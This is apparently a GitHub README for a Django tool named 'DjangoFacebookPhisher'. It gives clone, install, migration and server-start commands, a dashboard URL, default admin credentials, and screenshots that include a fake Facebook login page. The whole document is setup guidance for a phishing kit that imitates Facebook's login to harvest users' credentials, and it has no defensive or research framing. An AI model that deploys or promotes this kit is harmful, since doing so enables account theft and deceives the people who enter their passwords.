<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0-green?style=for-the-badge">
  <img src="https://img.shields.io/github/stars/dieng787/DjangoFacebookPhisher?style=for-the-badge">
  <img src="https://img.shields.io/github/issues/dieng787/DjangoFacebookPhisher?color=red&style=for-the-badge">
  <img src="https://img.shields.io/github/forks/dieng787/DjangoFacebookPhisher?color=teal&style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Author-BuzzDiengn?style=flat-square">
  <img src="https://img.shields.io/badge/Open%20Source-Yes-cyan?style=flat-square">
  <img src="https://img.shields.io/badge/Written%20In-Python-cyan?style=flat-square">
</p>



### Installation
- Download git
```
git clone git://github.com/dieng787/DjangoFacebookPhisher.git
```
```
cd DjangoFacebookPhisher
```
- Install Django 3.2.6
```
pip install -r requirements.txt
```
- Run the commands below to create SQL tables
``` 
python manage.py makemigrations 
```
- And
``` 
python manage.py migrate 
```
### Start the server

``` 
python manage.py runserver <YourPORT> 
```
- Example 
``` 
python manage.py runserver 80
```
### Configuration
- 
Default dashboard URL is: http://127.0.0.1/dash
you can change it by modifying facebook/config.py file

### screenshot

![dash](https://user-images.githubusercontent.com/59884359/128641010-dae25805-91ff-47be-8b97-36df1a6349f7.PNG)
![corbeille](https://user-images.githubusercontent.com/59884359/128642023-d906a159-5b08-4a1f-8ac1-0657766d90ac.PNG)
![fakelogin](https://user-images.githubusercontent.com/59884359/128641703-9b56e562-e6ba-4544-9749-c5bcd90d1a06.PNG)


### Admin login
<strong>Username:</strong> facebook
<br>
<strong>Password:</strong> facebook

